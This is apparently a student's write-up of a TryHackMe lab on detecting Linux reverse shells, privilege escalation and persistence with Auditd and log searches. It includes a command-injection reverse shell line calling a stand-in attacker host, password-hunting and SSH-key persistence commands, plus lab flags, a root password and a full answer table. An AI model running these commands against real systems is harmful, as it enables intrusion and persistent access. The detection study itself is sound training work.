# Linux Threat Detection 3

**Date:** 16 September 2026\
**Author:** Abhinav

## Overview

This room focused on more advanced Linux attacks after Initial Access.

``` text
Initial Access → Reverse Shell → Privilege Escalation → Persistence → Long-term Access
```

The main tool throughout the room was **Auditd + `ausearch`**,
especially for tracing processes and building a process tree.

------------------------------------------------------------------------

# Task 2 - Reverse Shells

A reverse shell gives an attacker a more useful shell when the original
command execution method is limited.

``` text
Attacker ← connection ← Victim
```

## TryPingMe `whoami`

I ran:

``` text
127.0.0.1 && whoami
```

The output was:

``` text
svctrypingme
```

This showed that the web application was executing my command as the
`svctrypingme` user.

## Reverse shell flag

I tested:

``` text
127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh
```

The flag was:

``` text
THM{revshells_practitioner!}
```

## IP that spawned a similar reverse shell

**Answer:**

``` text
10.14.105.255
```

I investigated the exported Auditd logs:

``` bash
ausearch -i -if /home/ubuntu/scenario/audit.log | grep "ping"
```

The matching activity showed the IP.

### Process-tree idea

For a real investigation I can start with:

``` bash
ausearch -i -x socat
```

Then follow the `ppid`:

``` bash
ausearch -i --pid <PPID>
```

and keep moving upward until I find the application that started the
reverse shell.

------------------------------------------------------------------------

# Task 3 - Privilege Escalation

A web attack may initially give an attacker a low-privileged account.
The attacker may then try to become root.

``` text
Web application → service user → privilege escalation → root
```

## Command used to search for `pass`

**Answer:**

``` text
grep -iR pass .
```

I searched the Auditd logs:

``` bash
ausearch -i -if /home/ubuntu/scenario/audit.log -x grep | grep -i "pass"
```

The `proctitle` showed the command:

``` text
grep -iR pass .
```

This recursively searches for `pass` in files.

## Command used to become root

**Answer:**

``` text
su root
```

I searched for root-related process activity:

``` bash
ausearch -i -if /home/ubuntu/scenario/audit.log | grep -Ei "root" | grep "proctitle"
```

The `proctitle` showed:

``` text
su root
```

## Root password

**Answer:**

``` text
nGql1pQkGa
```

I checked the TryPingMe directory:

``` bash
cd /opt/trypingme
ls -la
```

`ls -la` is important because it also shows hidden files. I found the
`.env` file and read it to obtain the password.

### Investigation idea

``` text
Initial user
    ↓
Suspicious commands
    ↓
Privilege escalation command
    ↓
Check user after escalation
    ↓
Investigate activity as root
```

------------------------------------------------------------------------

# Task 4 - Startup Persistence

Persistence allows malware to remain available after events such as a
reboot.

The two methods in this task were:

1.  Systemd service
2.  Cron job

## Systemd service persistence

I searched for changes to systemd files:

``` bash
ausearch -i -f /etc/system
```

The Auditd output showed a suspicious service file being modified.

I then inspected the service file and looked at its `ExecStart` value to
find the malware that the service launched.

The room's Medium walkthrough uses the same basic approach: identify the
modified service through Auditd, inspect `ExecStart`, and run the
referenced malware in the lab. citeturn0search0

The flag was:

``` text
THM{hidden_penguin!}
```

### My process

``` text
Auditd
  ↓
Find changed service
  ↓
Read service file
  ↓
Find ExecStart
  ↓
Identify malware
  ↓
Run malware in the lab
```

## Cron persistence

I searched for cron activity:

``` bash
ausearch -i -x crontab
```

Then checked:

``` bash
ls /var/spool/cron
ls /var/spool/cron/crontabs
```

I found the root crontab and checked it:

``` bash
crontab -l
```

The `@reboot` entry showed the persisted malware.

I ran the malware in the lab and got:

``` text
THM{ressurect_on_reboot!}
```

The Medium walkthrough follows the same sequence: find the cron
activity, inspect `/var/spool/cron/crontabs`, read the root crontab,
identify the `@reboot` command, and run the referenced malware.
citeturn0search0

> These malware execution steps were performed only inside the TryHackMe
> lab.

------------------------------------------------------------------------

# Task 5 - Account Persistence

Attackers can maintain access without leaving an obvious malware
process.

Two methods covered here were:

-   Creating a privileged user
-   Adding an SSH key

## User added to sudo

**Answer:**

``` text
koichi
```

I checked authentication logs:

``` bash
cat /var/log/auth.log | grep -E 'useradd'
```

The `useradd` event showed the newly created account. The corresponding
`usermod` activity showed it being added to the `sudo` group.

## File changed for SSH key persistence

**Answer:**

``` text
/root/.ssh/authorized_keys
```

I searched Auditd for changes to authorized SSH keys:

``` bash
ausearch -i -f /.ssh/authorized_keys
```

The output showed:

``` text
/root/.ssh/authorized_keys
```

This file contains public keys allowed to authenticate to the account.

### Important detection idea

Monitoring the actual file is useful because something like:

``` bash
echo "<key>" >> ~/.ssh/authorized_keys
```

may appear as a shell process because `echo` is a shell builtin.

So I can directly monitor:

``` bash
ausearch -i -f /.ssh/authorized_keys
```

------------------------------------------------------------------------

# Task 6 - Targeted Attacks and Recap

Linux can be the first entry point into a larger organization.

A possible attack chain is:

``` text
Internet-facing Linux server
          ↓
Compromise
          ↓
Privilege Escalation
          ↓
Persistence
          ↓
Internal access
          ↓
Further attack
```

Linux systems can be involved in targeted attacks, espionage, ransomware
and long-term intrusions.

The main SOC lesson is that a compromised Linux server should not be
treated as an isolated incident. It may become a stepping stone into
other systems.

------------------------------------------------------------------------

# Commands I Used

## Reverse shell

``` bash
ausearch -i -if /home/ubuntu/scenario/audit.log | grep "ping"
ausearch -i -x socat
ausearch -i --pid <PID>
ausearch -i --ppid <PID>
```

## Privilege escalation

``` bash
ausearch -i -if /home/ubuntu/scenario/audit.log -x grep | grep -i "pass"

ausearch -i -if /home/ubuntu/scenario/audit.log | grep -Ei "root" | grep "proctitle"

cd /opt/trypingme
ls -la
```

## Systemd persistence

``` bash
ausearch -i -f /etc/system
cat <suspicious-service-file>
```

## Cron persistence

``` bash
ausearch -i -x crontab
ls /var/spool/cron
ls /var/spool/cron/crontabs
crontab -l
```

## Account persistence

``` bash
cat /var/log/auth.log | grep -E 'useradd'
ausearch -i -f /.ssh/authorized_keys
```

------------------------------------------------------------------------

# Simple Mental Model

``` text
1. Get Access
      ↓
2. Reverse Shell
      ↓
3. Discover the system
      ↓
4. Search for passwords/secrets
      ↓
5. Become root
      ↓
6. Establish persistence
      ↓
7. Create another access method
```

Main detection sources:

``` text
auth.log       → SSH logins + user creation
Auditd         → commands + processes + file changes
Process tree   → where suspicious commands came from
Cron           → scheduled persistence
Systemd        → service persistence
SSH keys       → account persistence
```

------------------------------------------------------------------------

# Final Answers

  Task   Question                       Answer
  ------ ------------------------------ --------------------------------
  2      Output after `whoami`          `svctrypingme`
  2      Reverse shell flag             `THM{revshells_practitioner!}`
  2      Reverse shell IP               `10.14.105.255`
  3      Password search command        `grep -iR pass .`
  3      Privilege escalation command   `su root`
  3      Root password                  `nGql1pQkGa`
  4      Service persistence flag       `THM{hidden_penguin!}`
  4      Cron persistence flag          `THM{ressurect_on_reboot!}`
  5      User added to sudo             `koichi`
  5      SSH persistence file           `/root/.ssh/authorized_keys`

------------------------------------------------------------------------

# My Takeaway

The biggest thing I learned is that **Auditd becomes much more useful
when I follow process relationships instead of looking at isolated
commands**.

For example:

``` text
socat
 ↓
PPID
 ↓
TryPingMe
 ↓
Discovery
 ↓
Password searching
 ↓
su root
 ↓
Persistence
```

That gives me the story of what happened instead of just showing
separate log entries.

## Sanitization

For public documentation, unnecessary lab passwords, tokens, keys and
sensitive infrastructure details should be masked. I kept the commands
and lab answers because they are useful for revision.
